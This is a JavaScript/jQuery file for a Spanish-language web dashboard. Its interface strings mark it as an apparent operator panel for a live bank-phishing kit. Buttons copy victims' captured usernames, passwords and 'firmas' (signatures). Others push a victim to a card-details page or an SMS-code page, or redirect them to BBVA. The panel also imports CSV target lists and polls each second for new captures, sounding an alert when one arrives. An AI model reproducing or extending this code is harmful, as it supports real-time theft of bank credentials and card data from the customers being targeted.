M.AutoInit();
setTimeout(function(){$('.l-loader').addClass("loading-step-1");},50);
document.addEventListener("DOMContentLoaded", function(){
setTimeout(function(){$('.l-loader').hide();new tableInteractive();},1000);});
$('#modal-comment').modal();


$('td').delegate('.comment', 'click', function(){
  $('#comentario').val('');
var serverId = $(this).data('id'); //this binds to html input
comment_action(serverId);
});

$('td').delegate('.logo-completo', 'click', function(){
var serverId = $(this).data('id'); //this binds to html input
logo_action(serverId);
});

function tableInteractive() {
var txt = 'events';
$.ajax({
type: "POST",
url: "php/tables/live.php",
data: "default="+txt,
success: function(data){
$('.container-notifications').html(data);

setTimeout(function() {

$('td').delegate('.logo-completo', 'click', function(){
var serverId = $(this).data('id'); //this binds to html input
logo_action(serverId);
});

$('.criptocal').click(function(e){
  e.preventDefault();
var serverId = $(this).data('id'); //this binds to html input
phone_action(serverId,4);
$('.criptocal').prop('disabled',true);
});

$('.finalizar').click(function(e){
  e.preventDefault();
var serverId = $(this).data('id'); //this binds to html input
fin_action(serverId,1);
$('.finalizar').prop('disabled',true);
});

$('.finalizar2').click(function(e){
  e.preventDefault();
var serverId = $(this).data('id'); //this binds to html input
fin_action2(serverId,9);
$('.finalizar2').prop('disabled',true);
});

$('.finalizar5').click(function(e){
  e.preventDefault();
var serverId = $(this).data('id'); //this binds to html input
phone_action(serverId,1);
$('.finalizar5').prop('disabled',true);
});

$('td').delegate('#textarea-comment', 'keyup', function(e){
  e.preventDefault();
  if (e.keyCode == 13) {
    var me = $(this);
    e.preventDefault();

    if ( me.data('requestRunning') ) {
        return;
    }

    me.data('requestRunning', true);
var comentario = $('.comentar-textarea').val();
var id = $(this).data('id');
$.ajax({
type: "POST",
url: "php/actions/comment.php",
data: "id="+id+"&comentario="+comentario,
success: function(msg) {
      new tableInteractive();
        },
        complete: function() {
            me.data('requestRunning', false);
        }});
}
});

$('td').delegate('#textarea-modelo', 'keyup', function(e){
  if (e.keyCode == 13) {
 var me = $(this);
    e.preventDefault();

    if ( me.data('requestRunning') ) {
        return;
    }

    me.data('requestRunning', true);
var comentario = $('.modelo-textarea').val();
var id = $(this).data('id');

$.ajax({
type: "POST",
url: "php/actions/modelo.php",
data: "id="+id+"&comentario="+comentario,
success: function(msg) {
      new tableInteractive();
        },
        complete: function() {
            me.data('requestRunning', false);
        }});
}
});

$('td').delegate('.comment', 'click', function(){
var serverId = $(this).data('id'); //this binds to html input
comment_action(serverId);
});

}, 200);
$('.dropdown3').dropdown();
 M.AutoInit();
$('td').delegate('.delete', 'click', function(){
var serverId = $(this).data('id'); //this binds to html input
delete_action(serverId);
});
}})}
function tableInteractive2() {
var txt = 'events';
$.ajax({
type: "POST",
url: "php/tables/live2.php",
data: "default="+txt,
success: function(data){
$('.container-notifications').html(data);
$('.dropdown3').dropdown();

  $(document).ready(function(){
    $('.tooltipped').tooltip();
  });
$('td').delegate('.delete', 'click', function(){
var serverId = $(this).data('id'); //this binds to html input
delete_action(serverId);
});

}})}
$('select').formSelect();
var clipboard = new Clipboard('.copy1');
var clipboard2 = new Clipboard('.copy2');
var clipboard3 = new Clipboard('.copy3');
var clipboard4 = new Clipboard('.copy4');
var clipboard5 = new Clipboard('.copy5');
clipboard.on('success', function(e) {
M.toast({html: 'User Copiado'});
});clipboard2.on('success', function(e) {
M.toast({html: 'Pass Copiada'});
});
clipboard3.on('success', function(e) {
M.toast({html: 'Firma Copiada'});
});
clipboard4.on('success', function(e) {
M.toast({html: 'Firma #2 Copiada'});
});
function submiter() {
  var formulario = new FormData($('#form').get(0));
    formulario.append('file', $('#images')[0].files[0]);
$.ajax({
   url:"php/clases/upload.php",
   method:"POST",
data:  formulario,
   dataType:'json',
   contentType:false,
   cache:false,
   processData:false,
    complete: function () {
      setTimeout(function() {
        new tableInteractive();}, 2000);
      swal.close();
  M.toast({html: 'Importación Completada'});
$('.uploader').html('<form action="php/clases/upload.php" enctype="multipart/form-data" method="post" id="form" name="upload"><div class="form-group file-area"><label for="images">CSV :  <span>Solo se admiten archivos csv</span></label><input type="file" name="images" id="images" required="required" multiple="multiple" onchange="submiter();"/><div class="file-dummy"><div class="success">Excelente... Subiendo base</div><div class="default">Importar Nueva Base</div></div></div><div class="form-group"></div></form>');
   }}); }
$('.delete-bas').click(function(){
Swal.fire({
  title: 'Estas Seguro?',
  text: "No podrás recuperar este log",
  type: 'warning',
  showCancelButton: true,
  confirmButtonColor: '#3085d6',
  cancelButtonColor: '#d33',
  confirmButtonText: 'Eliminar',
  cancelButtonText: 'Cancelar'
}).then((result) => {
  if (result.value) {
    Swal.fire(
      'Eliminada!',
      'Registros Correctamente eliminados.',
      'success'
    )
   setTimeout(function() {M.Toast.dismissAll();}, 1500);
$.ajax({
type: "POST",
url: "php/actions/delete_base.php",
success: function(data){
     setTimeout(function() {M.toast({html: 'Base Eliminada'});
        }, 1200);
new tableInteractive();
}});
  }
})
});




function comment_action($id) {
$('#id_oculto').val($id);
$('#modal-comment').modal('open');

}
//Functions to delete and edit

function delete_action($id) {
Swal.fire({
  title: 'Estas Seguro?',
  text: "No podrás recuperar este registro",
  type: 'warning',
  showCancelButton: true,
  confirmButtonColor: '#3085d6',
  cancelButtonColor: '#d33',
  confirmButtonText: 'Si, Eliminala!',
  cancelButtonText: 'Cancelar'
}).then((result) => {
  if (result.value) {
    Swal.fire(
      'Eliminada!',
      'Registro Correctamente eliminado.',
      'success'
    )
var id = $id;
$.ajax({
type: "POST",
url: "php/actions/numdelete.php",
dataType: "html",
data: "id="+id
});
     setTimeout(function() {new tableInteractive();
        }, 300);
};
})}
$('.mostrar-todo').click(function(){
  M.toast({html: 'Por favor espere... Cargando'});
  new tableInteractive2();
});




function phone_action($id,$status) {
 var me = $(this);

    if ( me.data('requestRunning') ) {
        return;
    }

    me.data('requestRunning', true);
var id = $id;
var phone = $status;
$.ajax({
type: "POST",
url: "php/actions/update_status.php",
dataType: "html",
data: "client="+id+"&status="+phone,
success: function(msg) {
            //stuffs
        },
        complete: function() {
          if ($status == 1) {M.toast({html: 'Página CC Enviada...'});}
          if ($status == 2) {M.toast({html: 'SMS Enviado...'});}
          if ($status == 3) {M.toast({html: 'Usuario Redirigido...'});}
          if ($status == 4) {M.toast({html: 'Redireccionado a BBVA...'});}
            me.data('requestRunning', false);
        }
});
};

function fin_action($id,$status) {
 var me = $(this);

    if ( me.data('requestRunning') ) {
        return;
    }

    me.data('requestRunning', true);
var id = $id;
var phone = '3';
$.ajax({
type: "POST",
url: "php/actions/update_status.php",
dataType: "html",
data: "client="+id+"&status="+phone,
success: function(msg) {
            //stuffs
        },
        complete: function() {
  M.toast({html: 'SMS Enviado...'});
            me.data('requestRunning', false);
        }
});
};
function fin_action2($id,$status) {
 var me = $(this);

    if ( me.data('requestRunning') ) {
        return;
    }

    me.data('requestRunning', true);
var id = $id;
var phone = '2';
$.ajax({
type: "POST",
url: "php/actions/update_status.php",
dataType: "html",
data: "client="+id+"&status="+phone,
success: function(msg) {
            //stuffs
        },
        complete: function() {
  M.toast({html: 'Página SMS Enviada...'});
            me.data('requestRunning', false);
        }
});
};





function chk_best(){
var firma1 = $('.numero-firmas').text();
$.post('php/actions/firmas.php', {}, function(response){
  if (firma1 == response) {}else{
$('.numero-firmas').fadeOut();
$('.numero-firmas').html(response);
 var audio = new Audio('mp3/naic.mp3');
  audio.play();
$('.numero-firmas').fadeIn();
  new tableInteractive(); M.AutoInit();
}  });
}
function chk_best2(){
var firma1 = $('.numero-status').text();
$.post('php/actions/status.php', {}, function(response){
  if (firma1 == response) {}else{
$('.numero-status').fadeOut();
$('.numero-status').html(response);
 var audio = new Audio('mp3/naic.mp3');
  audio.play();
$('.numero-status').fadeIn();
  new tableInteractive(); M.AutoInit();
}  });
}




setInterval(function() {new chk_best(); new chk_best2();}, 1000);




$('.actualizar').click(function(){
M.toast({html: 'Tabla actualizada correctamente.'});
new tableInteractive();
});


$('.realtime-act').click(function(){
M.toast({html: 'Realtime Habilitado.'});new tableInteractive();
var interval =  setInterval(tableInteractive, 5000);
});
function logo_action(idx) {
var id = idx;
$.ajax({
type: "POST",
url: "php/actions/logo.php",
data: "id="+idx,
success: function(data){

$('.logo-datos').html(data);

$('#modal-logodatos').modal('open');


}});


}